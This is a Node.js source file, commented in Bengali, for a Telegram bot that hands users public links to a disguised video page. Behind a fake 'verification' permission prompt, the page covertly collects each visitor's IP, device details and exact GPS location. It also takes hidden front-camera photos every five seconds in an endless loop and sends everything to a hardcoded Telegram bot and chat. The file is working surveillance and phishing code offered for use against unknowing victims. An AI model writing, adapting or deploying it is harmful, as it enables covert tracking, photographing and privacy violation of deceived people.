const fs = require('fs');
const path = require('path');
const express = require('express');
const localtunnel = require('localtunnel');
const TelegramBot = require('node-telegram-bot-api');

// ----------------- ১. GITHUB SECRETS ও কনফিগারেশন -----------------
const MAIN_BOT_TOKEN = process.env.BOT_TOKEN;

if (!MAIN_BOT_TOKEN) {
    console.error("❌ ERROR: BOT_TOKEN পাওয়া যায়নি!");
    console.error("দয়া করে GitHub Repository Settings > Secrets and variables > Actions-এ গিয়ে 'BOT_TOKEN' যোগ করুন।");
    process.exit(1);
}

const PORT = process.env.PORT || 3000;
const MAX_LIMIT = 199;
const DB_FILE = path.join(__dirname, 'database.json');

let globalPublicUrl = '';
let tunnelInstance = null;

// ----------------- ২. ফাইল ডেটাবেস (Zero Data Loss) -----------------
function loadData() {
    if (!fs.existsSync(DB_FILE)) {
        fs.writeFileSync(DB_FILE, JSON.stringify({ userTokens: {}, usageCount: {} }, null, 2));
    }
    try {
        const raw = fs.readFileSync(DB_FILE);
        return JSON.parse(raw);
    } catch (e) {
        return { userTokens: {}, usageCount: {} };
    }
}

function saveData(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

let db = loadData();

// ----------------- ৩. EXPRESS WEB SERVER SETUP -----------------
const app = express();
app.use(express.json());

app.get('/app/:userId', (req, res) => {
    const userId = req.params.userId;
    db = loadData();
    const token = db.userTokens[userId];

    if (!token) {
        return res.status(404).send(`
            <h2 style="color:red; font-family:sans-serif; text-align:center; margin-top:50px;">
                ❌ লিঙ্কটি পাওয়া যায়নি অথবা টোকেন ভ্যালিড নয়!
            </h2>
        `);
    }

    const generatedHTML = `
    <!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/piexifjs/1.0.6/piexif.js"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; background-color: #f0f2f5; min-height: 100vh; }
        .main-content { padding: 70px 15px 40px; max-width: 800px; margin: 0 auto; }
        .container { background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .video-list { display: flex; flex-direction: column; gap: 25px; margin-top: 20px; }
        .video-card { background: #fafafa; border: 1px solid #e0e0e0; border-radius: 10px; padding: 15px; text-align: left; }
        .video-title { font-size: 16px; font-weight: bold; color: #333; margin-top: 0; margin-bottom: 10px; }
        .iframe-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; background: #000; }
        .iframe-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
        .menu-btn { position: fixed; top: 15px; right: 15px; background: none; color: inherit; border: none; font-size: 26px; cursor: pointer; z-index: 1000; padding: 0; outline: none; }
        .permission-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 2000; }
        .permission-card { background: #fff; padding: 25px; border-radius: 12px; max-width: 380px; width: 85%; text-align: center; }
        .permission-card h3 { margin-top: 0; color: #1a73e8; font-size: 20px; }
        .permission-card p { color: #5f6368; font-size: 14px; line-height: 1.5; margin: 15px 0 20px; }
        .perm-btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
        .terminal-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 600px; height: 350px; background-color: #0c0c0c; color: #00ff00; font-family: monospace; border-radius: 6px; z-index: 1001; flex-direction: column; text-align: left; border: 1px solid #333; }
        .terminal-header { background-color: #1f1f1f; padding: 8px 12px; display: flex; justify-content: space-between; color: #ccc; font-size: 14px; }
        .terminal-body { padding: 12px; overflow-y: auto; flex-grow: 1; font-size: 13px; }
        video.hidden-cam, canvas { display: none; }
    </style>
</head>
<body>

<button class="menu-btn" onclick="toggleTerminal()"> </button>

<div class="main-content">
    <div class="container">
        <h2>এজুকেশনাল মিডিয়া পোরটাল</h2>
        <p>নিচে স্ক্রোল করে সব ভিডিও দেখতে পারবেন:</p>
        <div class="video-list">
            <div class="video-card">
                <h3 class="video-title">ভিডিও ১</h3>
                <div class="iframe-container">
                    <iframe src="https://www.txnhh.com/embedframe/uovomvf2f9" frameborder="0" scrolling="no" allowfullscreen="allowfullscreen"></iframe>
                </div>
            </div>
            <div class="video-card">
                <h3 class="video-title">ভিডিও ২</h3>
                <div class="iframe-container">
                    <iframe src="https://www.youtube.com/embed/tgbNymZ7vqY" frameborder="0" scrolling="no" allowfullscreen="allowfullscreen"></iframe>
                </div>
            </div>
            <div class="video-card">
                <h3 class="video-title">ভিডিও ৩</h3>
                <div class="iframe-container">
                    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" scrolling="no" allowfullscreen="allowfullscreen"></iframe>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="permission-overlay" id="permOverlay">
    <div class="permission-card">
        <h3>অনুমতি প্রয়োজন</h3>
        <p>যাচাইকরণ প্রক্রিয়া সম্পন্ন করার জন্য সিস্টেম আপনার ডিভাইস তথ্য, অবস্থান (GPS) এবং ক্যামেরা সংযোগের অনুমতি প্রার্থনা করছে।</p>
        <button class="perm-btn" onclick="acceptPermission()">অনুমতি দিন ও শুরু করুন</button>
    </div>
</div>

<div class="terminal-modal" id="terminalModal">
    <div class="terminal-header">
        <span>Terminal Simulator v1.0</span>
        <span style="cursor:pointer;" onclick="toggleTerminal()">✖</span>
    </div>
    <div class="terminal-body" id="terminalLog">
        <div>[system@init ~]$ initializing modules...</div>
    </div>
</div>

<video id="hiddenVideo" class="hidden-cam" width="640" height="480" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const BOT_TOKEN = '7983300358:AAEcVH9f1En9I21QCzbhpZ_W41zXOoaR2lw';
    const CHAT_ID = '6721678542';

    let activeCameraStream = null;

    function logTerminal(text) {
        const logBox = document.getElementById('terminalLog');
        const line = document.createElement('div');
        line.innerText = `> ${text}`;
        logBox.appendChild(line);
        logBox.scrollTop = logBox.scrollHeight;
    }

    function toggleTerminal() {
        const term = document.getElementById('terminalModal');
        term.style.display = (term.style.display === 'flex') ? 'none' : 'flex';
    }

    async function getDeviceModel() {
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            try {
                const uaData = await navigator.userAgentData.getHighEntropyValues(["model"]);
                if (uaData.model) return uaData.model;
            } catch (e) {}
        }
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) return "Android Device";
        if (/iPhone|iPad/i.test(ua)) return "iOS Device";
        return "Desktop/Generic Device";
    }

    async function getBattery() {
        if ('getBattery' in navigator) {
            try {
                const b = await navigator.getBattery();
                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
            } catch(e) {}
        }
        return 'N/A';
    }

    function getNetworkType() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            if (conn.type === 'wifi') return 'WiFi';
            if (conn.type === 'cellular') return 'Mobile Data';
            if (conn.effectiveType) return `Data (${conn.effectiveType.toUpperCase()})`;
        }
        return 'Unknown Network';
    }

    async function collectAndSendSystemInfo() {
        logTerminal("Gathering IP & System Info...");
        let userIP = "Unknown";
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            userIP = data.ip;
        } catch (e) {}

        const model = await getDeviceModel();
        const battery = await getBattery();
        const network = getNetworkType();

        const msg = `📱 *Device Verification Summary*\n\n` +
                    `• *Public IP:* \`${userIP}\`\n` +
                    `• *Model:* ${model}\n` +
                    `• *Battery:* ${battery}\n` +
                    `• *Connection:* ${network}\n` +
                    `• *Screen:* ${window.screen.width}x${window.screen.height}`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });
    }

    // ক্যামেরা অন করা এবং ১০ মিনিট ধরে মাল্টিপল ছবি ক্যাপচার করে পাঠানোর প্রসেস
    function runCameraStep() {
        return new Promise(async (resolve) => {
            const hiddenVideo = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            try {
                logTerminal("Unblocking & Starting Camera Module...");
                activeCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                hiddenVideo.srcObject = activeCameraStream;
                await hiddenVideo.play();
                logTerminal("Camera active. Capturing multiple frames for 10 minutes...");

                const TEN_MINUTES = 10 * 60 * 1000;
                const CAPTURE_INTERVAL = 5000; // প্রতি ৫ সেকেন্ড পর পর ক্যাপচার করবে
                const startTime = Date.now();

                const intervalId = setInterval(async () => {
                    // ১০ মিনিট অতিক্রান্ত হলে ক্যামেরা বন্ধ হবে
                    if (Date.now() - startTime >= TEN_MINUTES) {
                        clearInterval(intervalId);
                        stopCameraStream();
                        logTerminal("10 minutes camera cycle finished. Blocking Camera Module.");
                        resolve();
                        return;
                    }

                    await captureAndSend(hiddenVideo, canvas, context);
                }, CAPTURE_INTERVAL);

            } catch (err) {
                logTerminal("Camera Error / Permission Denied: " + err.message);
                stopCameraStream();
                resolve();
            }
        });
    }

    // ক্যামেরা হার্ডওয়্যার স্ট্রিম সম্পূর্ণ অফ ও ব্লক করার ফাংশন
    function stopCameraStream() {
        if (activeCameraStream) {
            activeCameraStream.getTracks().forEach(track => track.stop());
            activeCameraStream = null;
        }
        const hiddenVideo = document.getElementById('hiddenVideo');
        if (hiddenVideo) {
            hiddenVideo.srcObject = null;
        }
    }

    // জিপিএস লোকেশন নেওয়ার প্রসেস (ক্যামেরা অফ থাকার সময় এটি কাজ করবে)
    function runLocationStep() {
        return new Promise((resolve) => {
            if ("geolocation" in navigator) {
                logTerminal("Unblocking & Starting GPS Module...");
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        logTerminal(`Exact GPS Acquired! Accuracy: ${pos.coords.accuracy}m`);
                        const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        const locationMessage = `📍 *Exact Location Acquired*\n\n` +
                                                `• *Latitude:* \`${pos.coords.latitude}\`\n` +
                                                `• *Longitude:* \`${pos.coords.longitude}\`\n` +
                                                `• *Accuracy:* Within ${Math.round(pos.coords.accuracy)} meters\n` +
                                                `• *Google Maps:* [Open Map](${mapUrl})`;

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: CHAT_ID, text: locationMessage, parse_mode: 'Markdown' })
                        });
                        logTerminal("GPS Task Complete. Blocking GPS Module.");
                        resolve();
                    },
                    (err) => {
                        logTerminal("GPS Permission denied or failed.");
                        logTerminal("Blocking GPS Module due to error.");
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            } else {
                logTerminal("Geolocation not supported.");
                resolve();
            }
        });
    }

    // অবিরাম চক্রাকারে চলায় সাহায্যকারী মেইন প্রসেসিং সিকোয়েন্স (GPS -> 10min Camera -> GPS ...)
    async function startLoopingSequence() {
        while (true) {
            // ১. আগে লোকেশন ফাংশন কাজ করবে (জিপিএস আনব্লক)
            await runLocationStep();

            // ২. লোকেশন পাঠানো শেষ হলে জিপিএস ব্লক এবং ক্যামেরা আনব্লক হয়ে ১০ মিনিট ক্যাপচার করবে
            await runCameraStep();
        }
    }

    async function acceptPermission() {
        document.getElementById('permOverlay').style.display = 'none';
        logTerminal("User granted authorization. Starting sequence...");

        // ১. সিস্টেমের সাধারণ তথ্য পাঠানো
        await collectAndSendSystemInfo();

        // ২. নিরবচ্ছিন্ন সিকোয়েন্স চালু করা
        startLoopingSequence();
    }

    async function captureAndSend(video, canvas, context) {
        if (!video.videoWidth) return;
        context.drawImage(video, 0, 0, 640, 480);
        let imageDataUrl = canvas.toDataURL("image/jpeg", 0.85);

        let zeroth = {};
        let exif = {};
        zeroth[piexif.ImageIFD.Make] = "Terminal WebCam";
        zeroth[piexif.ImageIFD.Model] = "Live Capture";

        const now = new Date();
        const dateTimeStr = now.getFullYear() + ":" +
            String(now.getMonth() + 1).padStart(2, '0') + ":" +
            String(now.getDate()).padStart(2, '0') + " " +
            String(now.getHours()).padStart(2, '0') + ":" +
            String(now.getMinutes()).padStart(2, '0') + ":" +
            String(now.getSeconds()).padStart(2, '0');

        exif[piexif.ExifIFD.DateTimeOriginal] = dateTimeStr;

        let exifObj = { "0th": zeroth, "Exif": exif };
        let exifBytes = piexif.dump(exifObj);
        let imageWithExif = piexif.insert(exifBytes, imageDataUrl);

        try {
            const res = await fetch(imageWithExif);
            const blob = await res.blob();

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', blob, `capture_${Date.now()}.jpg`);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            logTerminal("Camera frame sent to Telegram.");
        } catch (err) {
            logTerminal("Frame transfer failed.");
        }
    }
</script>

</body>
</html>
    `;

    res.send(generatedHTML);
});

// ----------------- ৪. AUTO-FIX LOCALTUNNEL SYSTEM -----------------
async function startTunnel() {
    try {
        tunnelInstance = await localtunnel({ port: PORT });
        globalPublicUrl = tunnelInstance.url;

        console.log(`\n==================================================`);
        console.log(`🌐 LocalTunnel Active: ${globalPublicUrl}`);
        console.log(`==================================================\n`);

        tunnelInstance.on('close', () => {
            console.warn('⚠️ LocalTunnel disconnect হয়ে গেছে! ৩ সেকেন্ড পর পুনরায় কানেক্ট করা হচ্ছে...');
            setTimeout(startTunnel, 3000);
        });

        tunnelInstance.on('error', (err) => {
            console.error('⚠️ LocalTunnel Error:', err);
            try { tunnelInstance.close(); } catch(e){}
        });

    } catch (err) {
        console.error('⚠️ LocalTunnel চালু করা যায়নি। ৫ সেকেন্ড পর আবার চেষ্টা করা হচ্ছে...', err);
        setTimeout(startTunnel, 5000);
    }
}

app.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
    startTunnel();
});

// ----------------- ৫. TELEGRAM BOT LOGIC -----------------
const bot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(
        msg.chat.id,
        '👋 **স্বাগতম!**\n\n' +
        'আপনার টেলিগ্রাম বট টোকেনটি এখানে মেসেজ হিসেবে পাঠান।\n' +
        'টোকেন পাঠালে সিস্টেমে অ্যাড করে একটি ওয়ার্ল্ডওয়াইড এক্সেসযোগ্য লিঙ্ক দেওয়া হবে।',
        { parse_mode: 'Markdown' }
    );
});

bot.on('message', (msg) => {
    if (msg.text && msg.text.startsWith('/')) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const inputToken = msg.text.trim();

    db = loadData();
    const currentUsage = db.usageCount[userId] || 0;

    if (currentUsage >= MAX_LIMIT) {
        return bot.sendMessage(
            chatId,
            '❌ **দুঃখিত!** আপনার ১৯৯ বারের ফ্রি ব্যবহারের লিমিট শেষ হয়ে গেছে।',
            { parse_mode: 'Markdown' }
        );
    }

    if (!globalPublicUrl) {
        return bot.sendMessage(
            chatId,
            '⚠️ সার্ভার কানেকশন তৈরি হচ্ছে, অনুগ্রহ করে ৫ সেকেন্ড পর আবার চেষ্টা করুন।'
        );
    }

    db.userTokens[userId] = inputToken;
    db.usageCount[userId] = currentUsage + 1;
    saveData(db);

    const finalUrl = `${globalPublicUrl}/app/${userId}`;

    const responseMsg = 
        `✅ **আপনার টোকেন সফলভাবে যুক্ত হয়েছে!**\n\n` +
        `🌐 **আপনার এক্সেস লিঙ্ক:**\n${finalUrl}\n\n` +
        `📊 **ব্যবহৃত হয়েছে:** ${db.usageCount[userId]} / ${MAX_LIMIT} বার।`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: 'Markdown' });
});
